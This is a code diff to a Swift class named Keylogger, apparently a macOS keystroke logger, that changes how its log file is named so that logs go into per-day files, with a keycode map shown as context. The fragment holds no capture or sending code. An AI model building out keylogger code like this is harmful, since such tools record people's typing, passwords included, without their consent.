@@ -18,8 +18,8 @@ class Keylogger
     //    var bundlePathURL = Bundle.main.bundleURL   // Path to where the executable is present - Change this to use custom path
     static var bundlePathURL = URL(fileURLWithPath: "/Users/etiennebeaulac/Downloads", isDirectory: true)
     static var keylogs = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Logs")
-    static var filenameUrl = keylogs.appendingPathComponent("logs")
-    static var filename = filenameUrl.path
+//    static var filenameUrl = keylogs.appendingPathComponent("logs")
+//    static var filename = filenameUrl.path
     var appName = "KeySaver"                    // Active App name, starts with this one
 //    var keylogs: URL                            // Folder
     
@@ -216,6 +216,12 @@ class Keylogger
         map[230] = ["\\RA","\\RA"] // right alt
         map[231] = ["\\RCMD","\\RCMD"] // right cmd
         return map
+    }
+    
+    static func getDateFile() -> URL {
+        let calendar = Calendar.current
+        let dateFile = "\(calendar.component(.day, from: Date()))-\(calendar.component(.month, from: Date()))-\(calendar.component(.year, from: Date()))"
+        return Keylogger.keylogs.appendingPathComponent(dateFile)
     }
     
 }
